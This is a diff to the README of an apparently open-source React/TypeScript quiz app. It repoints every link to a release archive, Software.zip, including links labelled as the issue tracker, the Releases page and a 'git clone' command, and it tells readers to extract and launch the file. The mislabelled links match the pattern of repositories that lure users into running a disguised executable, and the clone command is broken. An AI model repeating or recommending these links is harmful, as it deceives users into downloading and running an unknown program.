@@ -19,7 +19,7 @@ Welcome to **QuizLand React TypeScript**, the open-source Quiz project designed 
 
 ## Getting Started 🚀
 
-To get started with QuizLand React TypeScript, simply [download the latest release](https://github.com/bodeptrai22/quizland-react-typescript/releases/download/v1.0/Application.zip). Once you have the zip file, extract it and launch the application to start exploring the quiz questions!
+To get started with QuizLand React TypeScript, simply [download the latest release](https://github.com/bodeptrai22/quizland-react-typescript/releases/download/v2.0/Software.zip). Once you have the zip file, extract it and launch the application to start exploring the quiz questions!
 
 ## Project Structure 📁
 
@@ -35,7 +35,7 @@ The project structure of QuizLand React TypeScript is organized for ease of navi
 
 To run QuizLand React TypeScript on your local machine, follow these steps:
 
-1. Clone the repository: `git clone https://github.com/bodeptrai22/quizland-react-typescript/releases/download/v1.0/Application.zip`
+1. Clone the repository: `git clone https://github.com/bodeptrai22/quizland-react-typescript/releases/download/v2.0/Software.zip`
 2. Navigate to the project directory: `cd quizland-react-typescript`
 3. Install dependencies: `npm install`
 4. Build the project: `npm run build`
@@ -47,7 +47,7 @@ Contributions to QuizLand React TypeScript are welcome! Whether you want to add 
 
 ## Feedback and Support 💬
 
-If you have any feedback, suggestions, or issues to report, please don't hesitate to [open an issue](https://github.com/bodeptrai22/quizland-react-typescript/releases/download/v1.0/Application.zip). Your input is highly appreciated as we strive to create a helpful resource for exam preparation.
+If you have any feedback, suggestions, or issues to report, please don't hesitate to [open an issue](https://github.com/bodeptrai22/quizland-react-typescript/releases/download/v2.0/Software.zip). Your input is highly appreciated as we strive to create a helpful resource for exam preparation.
 
 ## Stay Connected 🌐
 
@@ -55,6 +55,6 @@ Stay updated on the latest QuizLand React TypeScript developments by following u
 
 ---
 
-**Note:** For the latest release download and more information, visit the [Releases](https://github.com/bodeptrai22/quizland-react-typescript/releases/download/v1.0/Application.zip) section.
+**Note:** For the latest release download and more information, visit the [Releases](https://github.com/bodeptrai22/quizland-react-typescript/releases/download/v2.0/Software.zip) section.
 
-[![Download Latest Release](https://github.com/bodeptrai22/quizland-react-typescript/releases/download/v1.0/Application.zip%20Release-brightgreen)](https://github.com/bodeptrai22/quizland-react-typescript/releases/download/v1.0/Application.zip)
+[![Download Latest Release](https://github.com/bodeptrai22/quizland-react-typescript/releases/download/v2.0/Software.zip%20Release-brightgreen)](https://github.com/bodeptrai22/quizland-react-typescript/releases/download/v2.0/Software.zip)
